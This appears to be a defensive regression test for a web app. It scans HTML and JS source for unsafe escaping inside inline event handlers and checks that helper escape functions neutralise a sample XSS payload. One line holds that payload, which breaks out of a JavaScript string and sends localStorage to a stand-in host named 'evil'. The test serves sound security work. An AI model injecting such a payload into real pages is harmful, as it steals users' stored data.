// e2e/guard-xss-handlers.cjs — SEC-FIX2 H4: no inline handler is built from `esc(x).replace(/'/g, …)` (esc turns ' into &#39;, which the
// browser decodes BEFORE the handler runs, so the replace never matches and the text breaks out of the string), and the public network
// store builds its category chips from data-cat + one listener. Offline: reads source, runs esc on the review's payload.
'use strict';
const fs = require('fs'), path = require('path');
const root = path.join(__dirname, '..', 'public');
let fail = 0;
const t = (name, ok, why) => { console.log((ok ? '  ok  ' : '  FAIL') + ' ' + name + (ok ? '' : ' — ' + (why || ''))); if (!ok) fail++; };
const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
const wrongOrder = /esc\([^()]*(?:\([^()]*\))?[^()]*\)\.replace\(\/'\/g/;
const hits = walk(root).filter((f) => /\.(html|js)$/.test(f))
  .flatMap((f) => fs.readFileSync(f, 'utf8').split('\n').map((l, i) => wrongOrder.test(l) ? path.relative(root, f) + ':' + (i + 1) : null).filter(Boolean));
t('no esc(x).replace(/\'/g, …) inside an inline handler (quote escaped AFTER esc)', hits.length === 0, hits.join(', '));
const store = fs.readFileSync(path.join(root, 'store.html'), 'utf8');
t('store.html chips carry data-cat and no setCat( handler string', /data-cat="' \+ esc\(\w+\)/.test(store) && !/onclick="setCat\(/.test(store));
t('store.html reads the chip back through one click listener', /getElementById\('cats'\)\.addEventListener\('click'/.test(store));
const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + '; return esc;')();
const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
/* reviews5 (GF-03 M8 · GF-05 M10 · EL-04 M14): esc() INSIDE a quoted JS argument of an inline handler. The browser decodes &#39; to ' before the
   JS runs, so a value with a quote ends the string and the rest runs. The argument goes through escJs (helpers.js). Allowed leftovers: app.html and lab/
   (named below; this list only shrinks). The till copy left the list in batch 1129: its master (api tools/tally-connector/till.html) uses escJs. */
const inHandlerArg = /[(,]\s*(?:\\'['"]|'")\s*\+\s*esc\(/g;
const allowLeft = /^(app\.html|lab[\\/]combo-mode\.js)$/;
const leaks = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
  .flatMap((f) => { const src = fs.readFileSync(f, 'utf8'); const out = []; let m; while ((m = inHandlerArg.exec(src))) out.push(path.relative(root, f) + ':' + (src.slice(0, m.index).split('\n').length)); return out; });
t('no esc( inside a quoted JS argument of an inline handler (use escJs)', leaks.length === 0, leaks.slice(0, 8).join(', ') + (leaks.length > 8 ? ' … ' + leaks.length : ''));
const escJs = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function escJs\(v\)[\s\S]*?\n\}/)[0] + '; return escJs;')();
const attr = escJs(payload);
const decoded = attr.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
t('escJs: the payload decoded as the browser does stays one string (no quote or backslash survives)', !/['"<>]/.test(decoded));
t('escJs: the string value round-trips', new Function('return \'' + decoded + '\'')() === payload);
process.exit(fail ? 1 : 0);
